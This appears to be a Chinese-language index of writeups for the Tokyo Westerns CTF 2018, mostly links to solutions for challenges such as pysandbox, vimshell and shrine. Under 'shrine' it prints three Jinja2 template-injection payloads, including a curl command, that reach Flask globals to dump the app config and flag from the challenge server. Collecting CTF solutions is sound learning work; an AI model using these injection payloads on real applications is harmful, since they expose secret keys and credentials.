比赛时间：2018/09/01 01:00:00 UTC — 2018/09/03 01:00:00 UTC

比赛地址：https://score.ctf.westerns.tokyo/

### Writeup

- **scs7**

  https://ctftime.org/writeup/10861 by hackstreetboys

- **pysandbox**

  https://ctftime.org/task/6513 by hackstreetboys

  https://ctftime.org/writeup/10852 by DoubleSigma

  https://github.com/pberba/ctf-solutions/tree/master/20180901_tokyo_western/pysandbox

- **vimshell**

  https://ctftime.org/writeup/10860 by Lorem Checksum

  https://ctftime.org/writeup/10859 by Lattice

  https://ctftime.org/writeup/10854 by DoubleSigma

- **shrine** 

  https://ctftime.org/writeup/10851 by DoubleSigma

  其他几种payload：

  ```bash
  curl -g "http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}"
  ```

  ```http
  http://shrine.chal.ctf.westerns.tokyo/shrine/{{session.__class__.__base__.get.__globals__['warnings']['sys']['modules']['app'].__dict__['app'].__dict__}}
  ```

  ```http
  http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.__class__.__dict__['_load_form_data'].__globals__['current_app'].config}}
  ```

- **其他**：

  [Revolutional Secure Angou](https://ctftime.org/writeup/10862) by SealTeam1

  [Tokyo Western CTF 2018 (Qualification Round) Hints for some Crypto challenges](https://github.com/nguyenduyhieukma/CTF-Writeups/tree/master/Tokyo%20Western%20CTF/2018) 

  
